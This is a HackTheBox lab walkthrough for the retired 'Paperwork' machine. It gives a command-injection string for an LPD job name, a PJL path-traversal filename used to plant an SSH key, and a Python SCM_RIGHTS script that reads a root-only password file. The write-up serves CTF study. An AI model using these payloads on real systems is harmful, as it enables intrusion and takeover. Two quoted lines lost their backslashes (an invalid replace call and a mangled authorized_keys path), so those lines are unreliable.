# Paperwork — HackTheBox

**Platform:** HackTheBox
**OS:** Linux
**Status: Retired — full walkthrough published.**

**Full walkthrough:** [l3dsec.com/walkthroughs/paperwork-htb](https://l3dsec.vercel.app/walkthroughs/paperwork-htb.html)

---

## Attack Chain

```
nmap → port 80 (nginx) + directory brute force
  → paperwork-archive-v1.02.zip → server.py (LPD source disclosed)
    → CVE: empty queue bypass + shell=True job_name injection → shell as lp
      → ps aux → jetdirect.py on 127.0.0.1:9100 (PJL, running as archivist)
        → FSUPLOAD → read source → path traversal in _translate()
          → FSDOWNLOAD + traversal → write SSH pubkey → SSH as archivist → user flag
            → paperwork-daemon (root) listens on /run/paperwork/mgmt.sock
              → opens admin_pins.conf as root at startup, keeps fd alive
                → SCM_RIGHTS fd leak on "intrusion detected" branch → read conf → su root → root flag
```

---

## 1. Enumeration

```bash
nmap -sC -sV 10.129.40.69
# 22/tcp — SSH
# 80/tcp — nginx (Document Archiving Service)
```

Directory brute force surfaces `paperwork-archive-v1.02.zip` — contains `server.py`, full source for the LPD service on port 1515.

---

## 2. Foothold — LPD Command Injection

Two bugs in `server.py` stack:

**Queue bypass** — `in` on a string is a substring check. An empty queue name passes unconditionally:
```python
if queue not in VALID_QUEUE:  # substring check, not membership check
```

**Shell injection** — `job_name` from the `J` line of the print job drops into a shell command with `shell=True`:
```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

Injection format:
```
job_name = x'; <command>; echo '
```

Python script speaks the LPD wire format over a raw socket and fires a reverse shell. Shell as `lp`.

---

## 3. Lateral Movement — PJL Path Traversal

`jetdirect.py` runs as `archivist` on `127.0.0.1:9100`. Path translation:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```

Strips `0:` and leading slashes. Does nothing about `../`. `os.path.normpath` resolves traversal sequences — it doesn't block them.

Wrote SSH public key via `FSDOWNLOAD` with traversal path:
```
NAME="0:\..\.sshuthorized_keys"
```

SSH in as `archivist`. User flag at `~/user.txt`.

---

## 4. Privilege Escalation — File Descriptor Leak via SCM_RIGHTS

`paperwork-daemon` runs as root. At startup it opens `/etc/paperwork/admin_pins.conf` as root — fd stays alive. It then listens on `/run/paperwork/mgmt.sock` (group `archivist`).

On connection, if the command log contains PJL trigger words (it does), the "intrusion detected" branch sends two fds to the client via `SCM_RIGHTS` ancillary data: the log file and the live root fd for `admin_pins.conf`.

Unix permission checks happen at `open()`, not `read()`. Once the fd is in an unprivileged process, it's readable with no further checks.

```python
import socket, array, os

fds = array.array("i", [0, 0])
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(fds.itemsize * 2))
for cmsg_level, cmsg_type, cmsg_data in ancdata:
    fds.frombytes(cmsg_data)
print(os.read(fds[1], 4096).decode())
# ADMIN_PASSWORD=ApparelMortuaryCedar22
```

Password works for `root`. Root flag at `/root/root.txt`.

---

## Flags

| Flag | Value |
|------|-------|
| User | `redacted` |
| Root | `redacted` |

---

> For educational purposes only. Only test systems you own or have explicit written permission to test.
